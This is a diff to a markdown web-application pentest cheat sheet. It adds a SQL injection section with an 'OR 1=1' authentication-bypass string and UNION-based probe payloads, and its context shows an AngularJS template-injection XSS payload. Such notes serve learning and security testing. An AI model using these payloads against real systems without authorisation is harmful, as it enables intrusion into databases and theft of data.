@@ -1,6 +1,6 @@
 # **<a name="webapp">Web Application table of Contents</a>**
 * [XSS](#xss)
-
+* [SQLi](#SQLi)
 
 
 # **<a name="xss">XSS</a>**
@@ -80,3 +80,16 @@ this will break out new paramiter in javascript
   `{{$on.constructor('alert(1)')()}}`
  
  
+# **<a name="SQLi">SQLi</a>**
+
+`xyz' OR 1=1--`
+
+## Union
+
+
+Injection
+
+`xyz' UNION SELECT 'a' WHERE 1=1--`
+
+`xyz' UNION SELECT 'a' WHERE 1=2--`
+
